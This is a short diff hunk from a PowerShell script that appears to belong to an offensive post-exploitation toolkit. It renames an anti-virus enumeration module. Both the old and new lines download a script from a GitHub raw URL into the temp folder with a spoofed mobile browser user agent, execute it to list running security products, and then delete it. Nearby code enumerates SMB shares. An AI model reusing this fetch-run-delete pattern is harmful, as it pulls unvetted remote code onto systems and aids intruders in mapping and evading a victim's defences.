@@ -378,14 +378,14 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
    write-host "Description : $Description"
 
 
-   ## GetAvs - Enumerate Anti-Virus process's running!
-   If(-not(Test-Path -Path "$Env:TMP\GetAvs.ps1" -EA SilentlyContinue))
+   ## GetCounterMeasures - Enumerate Anti-Virus process's running!
+   If(-not(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1" -EA SilentlyContinue))
    {
-      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetAvs.ps1" -OutFile "$Env:TMP\GetAvs.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1" -OutFile "$Env:TMP\GetCounterMeasures.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
    }
 
-   &"$Env:TMP\GetAvs.ps1" -Action verbose
-   Remove-Item -Path "$Env:TMP\GetAvs.ps1" -Force
+   &"$Env:TMP\GetCounterMeasures.ps1" -Action Enum
+   Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force
 
 
    ## Enumerate active SMB shares
